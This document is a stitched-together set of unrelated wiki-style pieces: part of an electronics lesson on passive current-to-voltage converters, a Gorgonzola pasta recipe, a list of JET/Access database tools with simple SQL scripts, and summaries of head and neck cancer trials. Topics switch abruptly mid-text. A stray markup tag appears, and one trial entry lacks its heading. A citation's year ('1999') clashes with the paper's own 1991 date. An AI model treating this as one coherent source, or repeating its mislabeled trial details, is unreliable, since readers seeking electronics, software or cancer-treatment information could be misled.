We may present the circuit operation and Ohm's law in a more attractive manner than V = R × I, if we visualize the invisible electrical quantities by means of voltage bars and current loops (Fig. 2). If you remember, in this &quot;geometrical&quot; presentation, the thickness of the current loop is proportional to the magnitude of the current and the height of the voltage bars is proportional to the corresponding voltages or drop (see also an interactive [http://www.circuit-fantasia.com/my-students/ske2004/classes/class2/i-to-v-old-page6-1.html animation]).

Then, we may present the circuit operation (and Ohm's law) graphoanalytically (Fig. 3). As the voltage across and the current through the two 2-terminal components (the voltage source and the resistor) are the same, we may superimpose their IV curves on a common coordinate system. The intersection of the two lines is the operating point A; it represents the current magnitudes of the current I&lt;sub&gt;A&lt;/sub&gt; and the voltage V&lt;sub&gt;A&lt;/sub&gt;.

When we vary the current of the input current source, its IV curve moves vertically (see also an interactive [http://www.circuit-fantasia.com/my-students/ske2004/classes/class2/i-to-v-old-page6-3.html animation]). As a result, the working point A slides over the IV curve of the resistor R; its slope represents the converter's ratio.

[[Image:I-to-v_iv_curves_1000.jpg|left|thumb|380px|Fig. 3. Graphoanalytical presentation of the circuit operation]][[Image:I-to-v_voltage_diagram_1000.jpg|right|thumb|380px|Fig. 4. Voltage distribution along the resistor R]] &lt;br style=&quot;clear:both;&quot;/&gt;

As before, we may use again the attractive graphical interpretation of Ohm's law called a voltage diagram (the voltage distribution along the resistive film inside a linear resistor, Fig. 4). Here, when the input current varies, the local voltages along the resistive film vary decreasing gradually from left to right (see also another interactive [http://www.circuit-fantasia.com/my-students/ske2004/classes/class1/v-to-i-old-page6-5.html animation]). In this arrangement, the angle α represents the input current I&lt;sub&gt;IN&lt;/sub&gt;.

== Applications ==

=== I-to-V converter acting as an output device ===

[[Image:I-to-v_voltage source 1000.jpg|right|thumb|350px|&lt;center&gt;Fig. 5. Current-controlled voltage source&lt;/center&gt;]]

'''Current-controlled voltage source.''' Although there are enough constant voltage sources in nature (primary and secondary batteries), if there is a current source but we need a voltage source, we may build it. For this purpose, we connect a current-to-voltage converter after the current source: 

''Voltage source = current source + current-to-voltage converter''

That means just to connect a humble resistor R in parallel to the input current source I&lt;sub&gt;IN&lt;/sub&gt; (the Norton's idea in electricity) - Fig. 5. 

If the load is ideal (that is, it has an infinite resistance), this compound voltage source will generate a constant voltage V&lt;sub&gt;OUT&lt;/sub&gt; = R.I. This voltage will affect the current, if the input current source is imperfect (see [[#Imperfections|imperfections]]).

&lt;br style=&quot;clear:left;&quot;/&gt;

[[Image:I-to-v_cr differentiator 1000.jpg|right|thumb|350px|&lt;center&gt;Fig. 6. V-to-V CR differentiator = V-to-I C differentiator + I-to-V converter&lt;/center&gt;]]

'''Compound passive converters:''' Similarly, in the popular passive circuits of capacitive differentiator, inductive integrator, antilogarithmic converter, etc., the resistor acts as a current-to-voltage converter:

''V-to-V CR differentiator = V-to-I C differentiator + I-to-V converter''

''V-to-V LR integrator = V-to-I L integrator + I-to-V converter''

''V-to-V DR antilog converter = V-to-I D antilog converter + I-to-V''

For example, a classic capacitive-resistive differentiator on Fig. 6 is built by using the simpler voltage-to-current capacitive differentiator (a bare capacitor) and a current-to-voltage converter. 

In these circuits, the respective I-to-V converters introduce some voltage drop, which affects the excitation voltage V&lt;sub&gt;IN&lt;/sub&gt;. As a result, the current decreases and an error appears (see the section about [[#Imperfections|imperfections]]).

[[Image:I-to-v_trans_switch_1000.jpg|right|thumb|350px|&lt;center&gt;Fig. 7. The collector resistor Rc acts as a current-to-voltage converter&lt;/center&gt;]]

'''Transistor collector resistor.''' A BJ transistor is a current-generating device. Therefore, in order to obtain a voltage as an output, a collector resistor is connected in the output circuit of the transistor stage. Examples of this technique are the common-emitter, common-base and differential amplifier, a transistor switch, etc. 

''Voltage-output transistor = current-output transistor + I-to-V converter''

''The transistor's collector resistor acts as a current-to-voltage converter.''

Since the voltage drop V&lt;sub&gt;Rc&lt;/sub&gt; is floating, usually the complementary (to the power supply) voltage drop V&lt;sub&gt;CE&lt;/sub&gt; is used as an output. As a result, these transistor circuits are inverting (when the input voltage rises, the output voltage drops and v.v.)

A similar technique is used, in order to obtain a voltage in the transistor emitter of the negative feedback current source. Examples of this technique are all the transistor circuits using series negative feedback.

''The transistor's emitter resistor acts as a current-to-voltage converter.''

&lt;br style=&quot;clear:both;&quot;/&gt;

=== I-to-V converter acting as an input device ===

[[Image:I-to-v_ammeter 1000.jpg|right|thumb|350px|&lt;center&gt;Fig. 8. Compound ammeter = I-to-V converter + voltmeter&lt;/center&gt;]]'''Compound ammeter.''' Today's measuring instruments (DVM's, analog-to-digital converters, etc.) are mainly voltmeters. If there is a need to measure a current, we connect a simple current-to-voltage converter (a shunt resistor) before the voltmeter. This ammeter is a composed device consisting of two components:

''Compound ammeter = current-to-voltage converter + voltmeter''

''The shunt resistor of a composed ammeter acts as a current-to-voltage converter.''

Although the active version is the perfect current measurement solution, the popular multimeters use exactly the passive version, in order to measure big currents (see power considerations).

&lt;br style=&quot;clear:both;&quot;/&gt;

== I-to-V converter as a part of active V-to-I converters ==

[[Image:I-to-v_trans_current_source_1000.jpg|left|thumb|350px|&lt;center&gt;Fig. 9. Transistor current source with negative feedback&lt;/center&gt;]][[Image:I-to-v_op-amp_current_source_1000.jpg|right|thumb|350px|&lt;center&gt;Fig. 10. Op-amp current source with negative feedback&lt;/center&gt;]]

Similarly, an op-amp voltage-to-current converter (a voltage-controlled constant current source) built by using a negative feedback is actually a reversed current-to-voltage converter. We can implement this powerful idea as a transistor version (Fig. 9) or as an op-amp version of a current source (Fig. 10). In these circuits, we connect a current-to-voltage converter (the bare resistor R) in the negative feedback loop. Then, in order to compare the voltage drop V&lt;sub&gt;R&lt;/sub&gt; proportional to the load current I with the input voltage V&lt;sub&gt;Z&lt;/sub&gt;, we connect the two voltages in series and apply their difference dV = V&lt;sub&gt;Z&lt;/sub&gt; - V&lt;sub&gt;R&lt;/sub&gt; to the input part of the regulating element (the base-emitter junction of the transistor T or the differential input of the op-amp OA). As a result, the regulating element establishes the current I = V&lt;sub&gt;R&lt;/sub&gt;/R ≈ V&lt;sub&gt;Z&lt;/sub&gt;/R by changing its output resistance so that to zero the voltage difference dV. In this way, the output current is proportional to the input voltage; the whole circuit acts as a voltage-to-current converter. 

&lt;br style=&quot;clear:both;&quot;/&gt;

== What are the input/output resistances? ==

[[Image:I-to-v_in_res_1000.jpg|right|thumb|350px|&lt;center&gt;Fig. 11. The input resistance of the passive I-to-V converter is R in parallel to R&lt;sub&gt;L&lt;/sub&gt;.&lt;/center&gt;]]


Do you remember that when we were considering the opposite voltage-to-current converter, we were investigating the input and output resistances? Let's do the same for the present current-to-voltage converter. Again, let's for concreteness assume a resistive load R&lt;sub&gt;L&lt;/sub&gt;.

'''What is the input resistance?''' First, connect an ammeter in series with and a voltmeter in parallel to the converter's input; then vary the input current to investigate the input resistance. Looking from the side of the input source we see two resistors connected in parallel - R and R&lt;sub&gt;L&lt;/sub&gt;; so, the input resistance is R&lt;sub&gt;IN&lt;/sub&gt; = R||R&lt;sub&gt;L&lt;/sub&gt;. As you can see, it depends on the load resistance RL. Only, we choose R &lt;&lt; R&lt;sub&gt;L&lt;/sub&gt;; so, R&lt;sub&gt;IN&lt;/sub&gt; ≈ R.

[[Image:I-to-v_out_res_1000.jpg|right|thumb|350px|&lt;center&gt;Fig. 12. The output resistance of the active I-to-V converter is Re in parallel to R.&lt;/center&gt;]]


'''What is the output resistance?''' Now, connect a voltmeter in parallel to and an ammeter in series with the converter's output; then, vary the load resistance (voltage) and observe the current to investigate the output resistance. Looking from the side of the load, we see two resistors connected in parallel - Re (the equivalent resistance of the input circuit) and R; so, the output resistance is R&lt;sub&gt;OUT&lt;/sub&gt; = Re||R. If the input current is created by an ideal current source, the output resistance is only R&lt;sub&gt;OUT&lt;/sub&gt; ≈ R.

&lt;br style=&quot;clear:both;&quot;/&gt;

== Imperfections ==

[[Image:Passive_i-to-v_converter_1000.jpg|right|thumb|350px|&lt;center&gt;Fig. 12. The voltage drop across the resistor R is troublesome and, at the same time, useful.&lt;/center&gt;]]


'''A problem.''' Only, a strange contradiction appears here. From one side, the voltage drop V&lt;sub&gt;R&lt;/sub&gt; across the resistor R is useful for us (this is the output voltage needed!). From the other side, this voltage drop is troublesome as it enervates the excitation voltage V&lt;sub&gt;IN&lt;/sub&gt; (here we suppose that the input current is created by a voltage source V&lt;sub&gt;IN&lt;/sub&gt; through the resistor Ri). Now the voltage difference V&lt;sub&gt;IN&lt;/sub&gt; - V&lt;sub&gt;R&lt;/sub&gt; determines the current instead the voltage V&lt;sub&gt;IN&lt;/sub&gt;. It turns out that measuring the current we disturb it! As a result, the current I&lt;sub&gt;IN&lt;/sub&gt; decreases:( What do we do to solve this contradiction?

You can explore the circuit operation in a more attractive way, if you click ''Exploring'' button in the interactive flash [http://www.circuit-fantasia.com/collections/circuit-collection/circuits/old-circuits/i-to-v-old.html movie] &lt;ref&gt;[http://www.circuit-fantasia.com/collections/circuit-collection/circuits/old-circuits/i-to-v-old.html Passive current-to-voltage converter] is an animated ''Flash'' tutorial revealing the philosophy of the passive version.&lt;/ref&gt; or if you go to ''Stage 2'' in the interactive flash [http://www.circuit-fantasia.com/collections/tools/pnfb-builder.html builder].&lt;ref&gt;[http://www.circuit-fantasia.com/collections/tools/pnfb-builder.html Op-amp circuit builder] ([http://www.circuit-fantasia.com/my_work/conferences/et_2003/builder/builder.pdf movie philosophy]) is an interactive ''Flash'' tutorial that shows how to transform any passive converter into an active one.&lt;/ref&gt;

&lt;br style=&quot;clear:both;&quot;/&gt;

== Improvement ==

'''Classic remedy.''' We can decrease the error caused by the resistor R just by decreasing its resistance. Only, the output voltage will decrease as well and probably we have to amplify it. Doing that, we will also amplify the noise... How to solve the problem then?

'''Looking for a perfect remedy.''' Obviously, we have to solve the contradiction so that the resistance R to exist and, at the same time, not to exist!?! How do we do this magic? A tip: remember what we do in life when something bad appears. If you do not manage to find a remedy, visit the related story about [[Circuit Idea/Op-amp Inverting Voltage-to-Current Converter|active voltage-to-current converter]] to get an answer.

''If you have the misfortune to suffer any serious ailment, such as hypochondria, or are of a nervous disposition, or are worried sick about your carbon footprint and think that sending a cheque to some &quot;offset company&quot; in Mongolia will do the trick, please keep away from this recipe !!''

''It is dynamite and will give you a guilty conscience for the next month !! If you are none of the above, and all you want to do in the years to come is die with a smile on your face, enjoy it, remembering though to check your blood pressure in the morning !!''

== Ingredients ==

* 500 [[Cookbook:Gram|g]] of the strongest Mountain or Valley [[Cookbook:Gorgonzola Cheese|Gorgonzola cheese]] you can buy. (''I don't care what anyone else says, an alternative cheese will NOT do!!'') 
* a few drops of [[Cookbook:Olive Oil|olive oil]]
* 150 g [[Cookbook:Ricotta|ricotta cheese]]
* a pinch of [[Cookbook:Mixed Herbs|mixed Herbs]]
* grated [[Cookbook:Nutmeg|nutmeg]]
* [[Cookbook:Zest|zest]] of one [[Cookbook:Lemon|lemon]]
* on standby - 1 glass of fresh [[Cookbook:Milk|milk]]
* penne or your favourite [[Cookbook:Pasta|pasta]] (though a &quot;ridged&quot; pasta is the best for this recipe!)
* water

== Procedure ==

# Put on the pasta to cook in plenty of salted water.
# Add the drops of olive oil to a preferably cast-iron saucepan, and crumble the pieces of Gorgonzola into it, on a VERY low heat. The cheese will melt and become runny, at which point add the ricotta cheese and continue to melt until the whole lot becomes a sauce.
# If the sauce remains too thick, add a little of the milk and heat up once again.
# Grate in plenty of nutmeg and add the mixed herbs and leave to stand for a little while.
# Once the pasta is cooked, drain well and tip into a mixing bowl.
# Add the Gorgonzola sauce, and using a wooden spoon, mix well.

Serve, as with ALL pasta sauces, immediately.

Buon Appetito, Wikibookians !!

There is a variety of different tools available for viewing and changing JET databases. Here are some of the more commonly used tools.

==Microsoft Access==

Microsoft Access (now Microsoft Office Access) is a member of the Microsoft Office suite of products, and was developed by Microsoft in tandem with the JET database. Its support for JET is comprehensive, offering graphical tools for designing tables, building queries, and viewing and editing data. Beyond that, it can also be used to build complete Microsoft Access applications.

Given that Microsoft Access is so tightly bound to JET, one might wonder why anyone would use any other tool. Here are a few reasons:

; It costs money. 
:Microsoft Access can be bought stand-alone, or as part of one of the Microsoft Office packages, but for anyone who doesn't need either of those for any other reason, it's an additional cost.
; It won't run scripts. 
:Many software developers prefer to manipulate database through scripts, text files with batches of statements that can be executed to perform aggregate tasks. Scripts can be easily integrated into a version control / configuration management system, and applied to development, test and production databases to repeat a tested scenario exactly the same in each environment. To do this in Microsoft Access, the developer needs to convert such scripts into Visual Basic for Applications (VBA) code that separates each statement into a separate execution unit.
; It's another tool to learn.
:Every tool needs the developer to learn something new, but Microsoft Access doesn't allow simple database scripts to be executed, so there is more learning in line for the developer.

Some alternatives are discussed below.

==Visual Studio==

Microsoft Visual Studio has had database manipulation tools since version 6. It provides tools for inspecting the various database objects including tables, views, and procedures, viewing and editing data in tables, and running scripts of SQL statements.

To use Visual Studio for working with a JET database, create a ''database project'' and point it at your .mdb file. In Visual Studio 2002 and later, database projects can be created as part of any solution (e.g. C#, VB.NET), or by themselves. In version 6, database projects are part of Visual Interdev, the web application development tool.

Visual Studio can be integrated with several popular version control / configuration management packages, and comes with a basic one called Visual SourceSafe.

Visual Studio allows scripts to execute against the JET database, with multiple SQL statements in a single file. To batch multiple JET SQL statements together, separate each with the statement &lt;code&gt;go&lt;/code&gt; on a line by itself, like this:

&lt;source lang=&quot;sql&quot;&gt;
Create Table B1
(
    ID integer not null,
    B1Desc varchar(50) with compression,
    Constraint B1_pk Primary Key(ID)
)
go
Insert Into B1(ID, B1Desc) Values (1, 'alpha')
go
Insert Into B1(ID, B1Desc) Values (2, 'beta')
go
&lt;/source&gt;

NB: take care not to end the script with a line that only has spaces on it, because the script processor will return an error when it tries to execute the (blank) line.

==JetSQLConsole==

[http://sourceforge.net/projects/jetsqlconsole/ JetSQLConsole] is a command line tool for manipulating JET databases. It is similar to mysqlclient, sqlcmd, and psql.

JetSQLConsole allows scripts of multiple SQL statements to be executed against a JET database as a single batch. Each statement must be terminated with a semicolon, &quot;&lt;code&gt;;&lt;/code&gt;&quot;, like this:

&lt;source lang=&quot;sql&quot;&gt;
Create Table B2
(
    ID integer not null,
    B2Desc varchar(50) with compression,
    Constraint B2_pk Primary Key(ID)
);
Insert Into B2(ID, B2Desc) Values (1, 'alpha');
Insert Into B2(ID, B2Desc) Values (2, 'beta');
&lt;/source&gt;

==PlaneDisaster.NET==

[http://plane-disaster.sourceforge.net/ PlaneDisaster.NET] is a GUI SQL editor. The curious name derives from the name of the database engine (JET → Plane) and its reputation for being unreliable (partly due to architectural problems, and partly from novice users ignoring [[../Data integrity|data integrity]] issues). 

In addition to allowing SQL scripts to be executed, PlaneDisaster.NET can:

* create a new JET database
* execute SQL statements &quot;on the fly&quot;
* view the contents of a table in a data grid
* generate SQL scripts for some database objects
* generate INSERT scripts for populating a table
* compact and repair a JET database
* also manipulate SQLite databases

==Jet compact utility==

[http://support.microsoft.com/kb/295334 Jet compact utility], JETCOMP.exe is a Microsoft utility that compacts databases created with Jet engine versions 3.x and 4.x.

==CUTE==

[[File:Cooled universal table editor snapshot.png|thumb|300px|A screenshot of CUTE]]

[http://cuteasp.sourceforge.net Cooled Universal Table Editor] is a '''free''' VBScript based ASP '''open source''' software application intended for '''editing databases''' (structure and data) '''on-line''' (web front-ended). Currently supports '''full Microsoft SQL Server and Microsoft Access databases edition''', and the creation of them, using a '''web browser''', like Mozilla Firefox or Internet Explorer. This are its features in detail:

* Full data edition for Microsoft Access and SQL Server databases.
* Ability to create new Microsoft Access and Microsoft SQL Server databases.
* Ability to create and edit tables and table views.
* Table structure viewer and editor.
* Multi-database management workspace. You can point directly to a Microsoft Access file (full path with *.mdb extension), a folder containing Microsoft Access database files or specify multiple DSN's. All your databases (in a hosting, for example) can be easily accessed this way.
* SQL command line system. You can execute any SQL query at two different levels: database and table level. You can access SQL commands in the same session with the embedded SQL history and quickly perform the most usual SQL actions using the SQL template selector.
* Data filters: edit and display your own personalized views to navigate and edit records easily.
* CSV export: tables can be exported using Comma Separated Values, to applications that support CSV like, Microsoft Excel.
* Microsoft Word export: tables can be exported using Microsoft Word format, to applications like Microsoft Word, but too to OpenOffice, or HTML/browsers editors.
* I18N. CUTE has corrected intensively and extensively UTE's issues with various characters in databases/tables/fields that made UTE non functional (like spaces in table names, for example).
* User login to prevent unauthorized access.

Its roots are in older UTE, Universal Table Editor.

==YouAccess==

[http://youaccess.sourceforge.net YouAccess] is a free (public domain license) console application intended for SQL management of Microsoft® Access™ databases from command line. Is written in VBScript and uses ADO and [http://en.wikipedia.org/wiki/Data_access_object DAO] internally for database creation and SQL execution.

==MDB Tools==

[http://mdbtools.sourceforge.net/ MDB Tools] is an open source project for documenting and reading JET databases. It supports JET 3 (Access 97) and JET 4 (Access 2000/2002) engines. The tools allow a user to list tables, generate table schema statements, and extract data as CSV and SQL insert statements. Several popular Linux distributions provide MDB tools through their package managers (look for mdbtools), and source for compiling the tools can be downloaded from [http://mdbtools.sourceforge.net/ SourceForge]. A simple GUI explorer / query tool is also provided (see [http://mdbtools.sourceforge.net/gmdb/gmdb2screenshot.png screenshot] (look for mdbtools-gui in Linux package managers).

{{Auto category}}

== JaSS==

[https://github.com/Bryan--Smith/JaSS/ JaSS] (JET and SQL Server) Database Manager is an open source Web Application intended to manage a Microsoft® Access™ JET database.

The current version will:
* List existing JET database (.mdb) files on the file system and create new JET databases.
* List tables and views on a JET database and create new and drop existing tables.  There is currently no ability to manage views.
* List columns on a JET database table and create new and drop existing columns.
* List indexes on a JET database table and create new and drop existing indexes.
* List constraints on a JET database table and create new and drop existing constraints.
* Query data on a JET database table.  The current version does not allow the insertion, modification or deletion data.
* Run any arbitrary SQL against a JET database.  This may be used to query data or to execute DML or DDL statements.

A future release may be extended to allow SQL Server databases to be managed.</text>

==General Head &amp; Neck==
===Surgery===
====Surgical Technique====
*'''RTOG 85-30''' (1989-1994)
**Randomized. 125 patients. Arm 1) standard surgery vs. Arm 2) surgery + cricopharyngeal myotomy
**'''1999''' PMID 10488976 -- &quot;Failure of cricopharyngeal myotomy to improve dysphagia following head and neck cancer surgery.&quot; (Jacobs JR, Arch Otolaryngol Head Neck Surg. 1999 Sep;125(9):942-6.)
***Outcome: No difference in oropharyngeal swallowing efficiency at 6 months
***Conclusion: No benefit for cricopharyngeal myotomoy

====Surgery + RT vs Primary RT====
*'''Scottland''' (1991-1993) -- Surgery + post-op RT vs radical RT
**Randomized. ''Trial closed prematurely after significant survival benefit for combined arm.'' 35 of expected 350 patients, 4 institutions, oral cavity/oropharynx, excluded T1N0.  Arm 1) Surgery + postop RT 60/30 vs Arm 2) radical RT 66/33 alone. Only 50% and 41% of patients respectively received XRT as planned, mainly due to machine breakdown
**'''1998''' PMID 9704176 -- &quot;Early closure of a randomized trial: surgery and postoperative radiotherapy versus radiotherapy in the management of intra-oral tumours.&quot; (Robertson AG, Clin Oncol (R Coll Radiol). 1998;10(3):155-60.) Median F/U 1.9 years
***Outcome: OS combined arm 53% vs. RT 11% (HR 0.24, SS); DSS 65% vs 33% (SS). Residual local disease 0% vs. 53% (SS)
***Conclusion: Surgery with postop RT superior to radical RT alone

====Surgery + RT vs. Primary Chemo-RT====
*'''Singapore''' (1996-2000)
**Randomized. ''Stopped early due to slow accrual.'' 199 patients, resectable Stage III/IV SCHNC excluding NPC and salivary glands (larynx 32% (supraglottis 23%), oral cavity 27%, oropharynx 21%, hypopharynx 12%). T4 56%. Arm 1) surgery + adjuvant RT 60/30 vs. Arm 2) RT 66/33 + concurrent cisplatin 20 mg/m2 + 5-FU 1000 mg/m2 x2 cycles. 90% received at least 1 cycle of chemo
**'''2005''' PMID 16012523 -- &quot;Surgery and adjuvant radiotherapy vs concurrent chemoradiotherapy in stage III/IV nonmetastatic squamous cell head and neck cancer: a randomised comparison.&quot; (Soo KC, Br J Cancer. 2005 Aug 8;93(3):279-86.) Median F/U 6 years
***Outcome: 3-year DFS: S+RT 50% vs. chemo-RT 40% (NS). Organ preservation (larynx/hypopharynx 68%, oropharynx 55%, oral cavity 21%, paranasal sinus 0%). Chemo-RT group had poor surgical salvage of 47%, with no long-term survivors
***Conclusion: Chemo-RT not superior to surgery+RT, but can be attempted for organ preservation in larynx, hypopharynx, and oropharynx


===Postoperative RT===
====Pre-op RT vs. Post-op RT====
*'''RTOG 73-03''' (1973-1979)
**Randomized. 320 patients. Operable stage T2-T4 any N (but not fixed); oral cavity, oropharynx, supraglottic larynx, hypopharynx, or maxillary sinus. Arm 1) Pre-op RT 50 Gy vs. Arm 2) Post-op RT 60 Gy. In addition, OC and OP lesions may be randomized Arm 3) definitive RT 65-70 Gy, with surgery reserved for salvage (n=43). 
**'''5-years; 1987''' PMID 3449477 &amp;mdash; &quot;Combined radiation therapy and surgery in the management of advanced head and neck cancer: final report of study 73-03 of the Radiation Therapy Oncology Group.&quot; (Kramer S et al. Head Neck Surg. 1987 Sep-Oct;10(1):19-30.) Median F/U 5 years
***Outcome: LRC post-op 65% vs pre-op 48% (SS). Higher rate of persistent disease and recurrence in pre-op. Trend toward improved survival, 38% vs 33% (p=0.1). 
***Toxicity: Complication rate similar. 
***Definitive RT arm: For OC and OP lesions (three-arm randomization), 4-yr OS pre-op 30% vs post-op 36% vs definitive 33% (NS), and LRC 43% vs 52% vs 38% (NS); however total number of patients was small
***Conclusion: Post-op RT superior to pre-op RT; insufficient info on definitive RT comparison 
**'''10-years; 1999''' PMID 1993628 &amp;mdash; &quot;Randomized study of preoperative versus postoperative radiation therapy in advanced head and neck carcinoma: long-term follow-up of RTOG study 73-03.&quot; (Tupchong L et al. Int J Radiat Oncol Biol Phys. 1991 Jan;20(1):21-8.)
***Only pre-op vs. post-op subset (n=277). Oral cavity (14%), oropharynx (17%), hypopharynx (43%), supraglottic larynx (26%) 
***Outcome: LRC pre-op 58% vs. post-op 70% (SS), &lt;2 years no difference (failures 59% vs. 58%), but marked &gt;2 years (failures 27% vs 8%); OS no difference due to late (&gt;2 years) deaths from DM and from second primaries
***Supraglottic larynx: LRC pre-op 53% vs. post-op 77% (SS); 78% failures &lt;2 years
***Toxicity: no difference
***Conclusion: Post-op RT better for LRC (especially in SGL), but no impact on OS due to distant failure and second primaries
**Comment: some argument for definitive chemoRT instead of surgery and post-op RT since after 2 yrs, distant mets are primary cause of failure resulting in similar 10 OS in this trial. LRC still better for post-op vs definitive RT alone. Also, different doses used, at the time believed equivalent given the setting


====Induction Chemotherapy vs. Surgery + Post-op RT====
*'''SWOG 8006''' (1980-1985) -- Induction chemo vs. standard surgery + RT
**Randomized. 158 patients. Stage III-IV, resectable HNSCC (oral cavity, oropharynx, hypopharynx, larynx). Arm 1) Surgery + post-op RT vs. Arm 2) Induction cisplatin 50 mg/m2 + MTX + vincristine + bleomycin
**'''1988''' PMID 3054373 -- &quot;Preoperative chemotherapy in advanced resectable head and neck cancer: final report of the Southwest Oncology Group.&quot; (Schuller DE, Laryngoscope. 1988 Nov;98(11):1205-11.) Median F/U 5 years
***Outcome: median OS induction chemo 1.5 years vs. control 2.5 years (NS)
***Conclusion: No benefit for induction chemo


====Post-op RT vs. Post-op concurrent chemo-RT====
*'''RTOG 95-01 / Intergroup''' (1995-2000) -- cisplatin 100 mg/m2 Q3W
**Randomized. 416 patients. Oral cavity, oropharynx, larynx, hypopharynx. Macroscopically complete resection. High risk (2 or more positive lymph nodes, or ECE, or SM+). Arm 1) RT alone vs RT with concurrent cisplatin (100 mg/m2 Q3W x 3 cycles). RT 60/30 plus optional boost to 66/33 high-risk areas. High risk groups: 81% with 2+ LN or ECE+; 19% with positive margins. Primary endpoint LRC.
**'''2-years; 2004''' PMID 15128893 &amp;mdash; &quot;Postoperative concurrent radiotherapy and chemotherapy for high-risk squamous-cell carcinoma of the head and neck.&quot; (Cooper JS et al. N Engl J Med. 2004 May 6;350(19):1937-44.). Median F/U 3.7 years
***Outcome: 2 year LRC chemo-RT 82% vs. RT 72% (SS), DFS significantly increased with a HR of 0.78 (2-year estimates not reported), but OS not significantly different.
***Toxicity: acute Grade 3+ chemo-RT 77% vs. RT 34% (SS); late effects 21% vs. 17% (NS); 2% treatment-related death, all in chemo-RT group
***Conclusion: In high risk patients, postop concurrent chemo-RT improves LRC and DFS. Toxicity is substantially higher

*'''France''' (1994-2002) -- carboplatin 
**Randomized. ''Stopped early after publication of French trial (Bachaud 1996)''. 144 patients, oropharynx (49%), hypopharynx (29%), larynx (22%), T1-4N0-3, macroscopic resection. Surgery + neck dissection. Arm 1) RT vs. Arm 2) RT + concurrent carboplatin 50mg/m2 BIW. RT 54 Gy if R0, 72 Gy if R1, bilateral neck 54 Gy, ECE boost 9 Gy.
**'''2008''' PMID 18222010 -- &quot;Randomized clinical trial of post-operative radiotherapy versus concomitant carboplatin and radiotherapy for head and neck cancers with lymph node involvement.&quot; (Racadot S, Radiother Oncol. 2008 Jan 24 [Epub ahead of print]). Median F/U 8.8 years
***Outcome: 2-year LRC RT alone 68% vs. chemo-RT 73% (NS), worse for oropharynx vs. larynx; OS 55% vs. 58% (NS)
***Conclusion: Concurrent carboplatin BIW showed no benefit

*'''EORTC 22931''' (1994-2000) -- cisplatin 100 mg/m2 Q3W
**Randomized. 334 patients. Oral cavity, oropharynx, hypopharynx, or larynx. T3-4 any N with negative margins (except T3N0 of larynx); T1-2 N2-3; T1-2 N0-1 with high-risk features (ECE, SM+, PNI, LVI); or oral cavity/oropharynx with LN+ at levels IV or V. Arm 1) RT alone vs. Arm 2) RT + concurrent cisplatin 100 mg/m2 Q3W. RT dose 54/27 +  boost to 66 Gy high risk areas. High risk groups: 56% with 2+ LN; 26% with positive margins; 53% with extracapsular extension. Primary end-point PFS.
**'''5-years; 2004''' PMID 15128894 - &quot;Postoperative irradiation with or without concomitant chemotherapy for locally advanced head and neck cancer.&quot; (Bernier J, N Engl J Med. 2004 May 6;350(19):1945-52.) Median F/U 5 years
***Outcome: 5-year PFS chemo-RT 47% vs RT 36% (SS); OS 53% vs 40% (SS); LRC 82% vs 69% (SS). No difference in DM rate (21% vs. 25%, NS). 
***Toxicity: No difference between groups

**Randomized. 450 patients. Larynx T2-T4 N0-N2 (21% by AJCC staging) or Hypopharynx T2-T4 N0-N2 (79% by AJCC staging), surgical candidates for total laryngectomy not requiring flap closure. Excluded if candidates for partial laryngectomy. Arm 1) Sequential chemo-&gt;RT. Induction cisplatin 100 mg/m2 + 5-FU 1000 mg/m2 x4 cycles followed by RT 70 Gy; if stable/progression on chemo, total laryngectomy vs Arm 2) Alternating chemo-&gt;RT. Cisplatin 20 mg/m2 + 5-FU 200 mg/m2 x1 week -&gt; RT 20 Gy -&gt; cisplatin/5-FU x1 week -&gt; RT 20 Gy -&gt; cisplatin/5-FU x1 week (based on prior Italian randomized data)
**'''6-years; 2009''' PMID 19176454 -- &quot;Phase 3 Randomized Trial on Larynx Preservation Comparing Sequential vs Alternating Chemotherapy and Radiotherapy.&quot; (Lefebvre JL, J Natl Cancer Inst. 2009 Jan 27. [Epub ahead of print]) Median F/U 6.5 years
***Outcome: Larynx preservation sequential 1.6 years vs. 2.3 years (NS); 5-year larynx preservation 30% vs. 36% (NS). Median OS sequential 4.4 years vs. alternating 5.1 years (NS); median PFS 3.0 vs 3.1 years (NS). DSS ~50%. Salvage surgery sequential 30% vs. alternating 22%. No difference in patterns of relapse
***Toxicity: Grade 3-4 mucositis sequential 32% vs. alternating 21%; late fibrosis 16% vs. 11%
***Conclusion: Both strategies valid for larynx preservation
***Editorial (PMID 19176460): larynx preservation defined as survival with larynx without tumor, tracheotomy or use of feeding tube, which gives these states equal utility as death; other issues with endpoints used for larynx preservation. Need a common standardized endpoint

*'''EORTC 24891''' (1990-1993) - Surgery + post-op RT vs Induction cisplatin/5-FU + RT
**Randomized. 194/202 patients. Operable SCC of the pyriform sinus or AE fold, Stage T2-T4 N0-N2b, N3 (N2c initially allowed, stopped in 1992). Arm 1) Immediate surgery + post-op RT 50-70 Gy vs. Arm 2) Induction cisplatin 100 mg/m2 + 5-FU 1000 mg/m2 x2 cycles. If CR, then RT 70 Gy. If PR, then cisplatin/5-FU x another cycle. If CR, then RT 70 Gy. If PR, or PD anytime, then surgery. RT given 50 Gy bilateral neck + 20 Gy boost to tumor/palpable LNs. Surgery was total laryngectomy with partial pharyngectomy to allow primary closure
**'''10-years; 2004''' [http://www.asco.org/ASCO/Abstracts+&amp;+Virtual+Meeting/Abstracts?&amp;vmview=abst_detail_view&amp;confID=26&amp;abstractID=3215 ASCO Abstract] -- &quot;Is laryngeal preservation (LP) with induction chemotherapy (ICT) safe in the treatment of hypopharyngeal SCC? Final results of the phase III EORTC 24891 trial.&quot; (Lefebvre JL, Journal of Clinical Oncology, 2004 ASCO Annual Meeting Proceedings (Post-Meeting Edition). Vol 22, No 14S (July 15 Supplement), 2004: 5531) Median F/U 10 years
***Outcome: 5-year OS surgery 33% vs. chemo-RT 38%; 10-year OS 14% vs. 13%. 5-year PFS 26% vs. 32%. Larynx preservation 5-years 22% (58% survivors), 10-years 9% (69% survivors)
***Conclusion: Similar survival curves with larynx preservation as with conventional total laryngectomy, with 2/3 survivors retaining their larynx

==Salivary Glands==
*'''RTOG-MRC Neutron Trial''' -- neutrons vs. photons/electrons
**Randomized. ''Stopped early due to neutron advantage.'' 32 patients, inoperable or recurrent major or minor salivary gland tumors. Arm 1) Neutrons (17-22 nGy) vs. Arm 2) photon/electrons (55 Gy/4 weeks or 70 Gy/7.5 weeks)
**'''Final; 1993''' PMID 8407397 -- &quot;Neutron versus photon irradiation for unresectable salivary gland tumors: final report of an RTOG-MRC randomized clinical trial.&quot;  (Laramore G, Int J Radiat Oncol Biol Phys. 1993 Sep 30;27(2):235-40)
